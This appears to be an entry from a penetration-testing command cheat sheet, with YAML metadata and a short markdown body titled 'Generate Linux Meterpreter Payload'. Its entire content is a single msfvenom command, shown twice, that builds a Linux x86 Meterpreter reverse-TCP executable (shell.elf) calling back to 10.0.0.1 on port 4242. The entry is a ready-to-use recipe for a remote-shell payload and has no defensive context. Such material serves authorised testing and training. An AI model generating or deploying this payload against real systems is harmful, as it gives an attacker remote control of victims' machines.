---
id: bcf7b0dd-a0af-4e60-a43c-fa39230846a5
name: Generate Linux Meterpreter Payload
type: command
executor: bash
data: $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242
  -f elf > shell.elf
output: null
created_at: '2023-04-06T03:56:24.923327+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Linux Meterpreter Payload

```bash
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
```


